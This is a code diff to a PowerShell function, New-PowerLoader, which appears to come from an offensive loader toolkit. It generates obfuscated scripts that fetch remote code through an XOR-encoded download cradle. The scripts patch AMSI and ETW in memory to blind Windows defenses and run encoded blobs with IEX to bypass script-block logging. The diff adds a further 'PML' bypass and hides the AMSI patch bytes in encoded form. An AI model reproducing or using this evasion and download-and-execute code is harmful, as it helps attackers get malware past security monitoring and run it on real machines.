@@ -49,7 +49,7 @@ function New-PowerLoader {
         [string[]]
         $ArgumentList,
 
-        [ValidateSet("AMSI","ETW","SBL")]
+        [ValidateSet("AMSI","ETW","SBL","PML")]
         [string[]]
         $Bypass,
 
@@ -72,7 +72,7 @@ function New-PowerLoader {
         $bytes = [Text.Encoding]::UTF8.GetBytes($FileUrl)
         $bytes = $bytes | foreach {$_ -bxor 1}
         $encUrl = Get-EncodedByte($bytes)
-        $srcCode += '$code = Invoke-DownloadCradle([Text.Encoding]::UTF8.GetString($(Get-DecodedByte("' + $encUrl + '") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
+        $srcCode += '$code = Invoke-DownloadCradle([Text.Encoding]::UTF8.GetString((Get-DecodedByte("' + $encUrl + '") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
         if ($ClearComments -and $Type -eq "PoSh") {
             $srcCode += ${function:Remove-PoshComments}.Ast.Extent.Text + [Environment]::NewLine
             $srcCode += '$code = Remove-PoshComments($code)' + [Environment]::NewLine
@@ -87,7 +87,7 @@ function New-PowerLoader {
         $bytes = [Text.Encoding]::UTF8.GetBytes($args)
         $bytes = $bytes | foreach {$_ -bxor 1}
         $encArgs = Get-EncodedByte($bytes)
-        $srcArgs = '$args = $([Text.Encoding]::UTF8.GetString($(Get-DecodedByte("' + $encArgs + '") | foreach {$_ -bxor 1}))).Split('','')' + [Environment]::NewLine
+        $srcArgs = '$args = ([Text.Encoding]::UTF8.GetString((Get-DecodedByte("' + $encArgs + '") | foreach {$_ -bxor 1}))).Split('','')' + [Environment]::NewLine
     }
     else {
         $srcArgs = '$args = $null' + [Environment]::NewLine
@@ -99,27 +99,31 @@ function New-PowerLoader {
     }
     switch ($Bypass) {
         'AMSI' {
-            $srcBypass += '$d = $([Text.Encoding]::UTF8.GetString($(Get-DecodedByte("H4sIAAAAAAAEAEvIKcrQT83NBQCpd2pDCAAAAA==") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
-            $srcBypass += '$f = $([Text.Encoding]::UTF8.GetString($(Get-DecodedByte("H4sIAAAAAAAEAHPIKcoISkrIdy5JT08pBgCSRCbiDgAAAA==") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
-            $srcBypass += 'if ([Environment]::Is64BitOperatingSystem) {$p = [byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)} else {$p = [byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00)}' + [Environment]::NewLine
+            $srcBypass += '$d = ([Text.Encoding]::UTF8.GetString((Get-DecodedByte("H4sIAAAAAAAEAEvIKcrQT83NBQCpd2pDCAAAAA==") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
+            $srcBypass += '$f = ([Text.Encoding]::UTF8.GetString((Get-DecodedByte("H4sIAAAAAAAEAHPIKcoISkrIdy5JT08pBgCSRCbiDgAAAA==") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
+            $srcBypass += 'if ([Environment]::Is64BitOperatingSystem) {$p = (Get-DecodedByte("H4sIAAAAAAAEANsZxsjWeAgANMiX0AYAAAA=") | foreach {$_ -bxor 1})} else {$p = (Get-DecodedByte("H4sIAAAAAAAEANsZxsjWeFiSEQCkiImCCAAAAA==") | foreach {$_ -bxor 1})}' + [Environment]::NewLine
             $srcBypass += 'Invoke-MemoryPatch -Dll $d -Func $f -Patch $p' + [Environment]::NewLine
         }
         'ETW' {
-            $srcBypass += '$d = $([Text.Encoding]::UTF8.GetString($(Get-DecodedByte("H4sIAAAAAAAEAMsvTc3N1QdiALm3ONgJAAAA") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
-            $srcBypass += '$f = $([Text.Encoding]::UTF8.GetString($(Get-DecodedByte("H4sIAAAAAAAEAHMpLXMpT8kvDSvOKE0BAGFTlzkNAAAA") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
-            $srcBypass += 'if ([Environment]::Is64BitOperatingSystem) {$p = [byte[]] (0xc3)} else {$p = [byte[]] (0xc2, 0x14, 0x00, 0x00)}' + [Environment]::NewLine
+            $srcBypass += '$d = ([Text.Encoding]::UTF8.GetString((Get-DecodedByte("H4sIAAAAAAAEAMsvTc3N1QdiALm3ONgJAAAA") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
+            $srcBypass += '$f = ([Text.Encoding]::UTF8.GetString((Get-DecodedByte("H4sIAAAAAAAEAHMpLXMpT8kvDSvOKE0BAGFTlzkNAAAA") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
+            $srcBypass += 'if ([Environment]::Is64BitOperatingSystem) {$p = [byte[]] (0xC3)} else {$p = [byte[]] (0xC2, 0x14, 0x00, 0x00)}' + [Environment]::NewLine
             $srcBypass += 'Invoke-MemoryPatch -Dll $d -Func $f -Patch $p' + [Environment]::NewLine
         }
         'SBL' {
             $srcBypass += '$b = "H4sIAAAAAAAEADWOUUsDMRCEf8s9GO6gR/5CUVAEsXhihdKHJdmmW71NuE1WQumPNyf4OMN8M6O5Xg/veD7arQjOnqt9RP2oCw5mqqI42xdIEHDGpHZbNM6gFJOdXKZFHzi6L9OvzBMhnwYjFBJoyShmNLuY3opncqNow1xLTqifwAWHu1SYx2GHP5tX/41Ou//B+8jcdFuRVpwwk7PPIJeGHkQzpXA0fX9zoO5y3WdS3Owhp+a3ir9bnV9/dRxDWF1fFxDpzkCMJ2tuvxHo1jL1AAAA"' + [Environment]::NewLine
-            $srcBypass += 'IEX $([Text.Encoding]::UTF8.GetString($(Get-DecodedByte($b) | foreach {$_ -bxor 1})))' + [Environment]::NewLine
+            $srcBypass += 'IEX ([Text.Encoding]::UTF8.GetString((Get-DecodedByte($b) | foreach {$_ -bxor 1})))' + [Environment]::NewLine
+        }
+        'PML' {
+            $srcBypass += '$b = "H4sIAAAAAAAEANN0SynV8clLLclNUfTJSCrOK8pLL9UPzCtLKQ7KTMnN1Q8pzcjNKK3Q0PfNSwvMKEzJzchPcalMSSopzcjLd00pTcjILbJRTU/ILUqx0gQZFhgUlJ9QmJGP3TinvOIUYswCAC6sebGYAAAA"' + [Environment]::NewLine
+            $srcBypass += 'IEX ([Text.Encoding]::UTF8.GetString((Get-DecodedByte($b) | foreach {$_ -bxor 1})))' + [Environment]::NewLine
         }
     }
 
     switch ($Type) {
         'PoSh' {
             $srcLoader = ${function:Invoke-PoshLoader}.Ast.Extent.Text + [Environment]::NewLine
-            $srcLoader += 'Invoke-PoshLoader -Code $([Text.Encoding]::UTF8.GetString($code)) -ArgumentList $args'
+            $srcLoader += 'Invoke-PoshLoader -Code ([Text.Encoding]::UTF8.GetString($code)) -ArgumentList $args'
         }
         'NetAsm' {
             $srcLoader = ${function:Invoke-NetLoader}.Ast.Extent.Text + [Environment]::NewLine
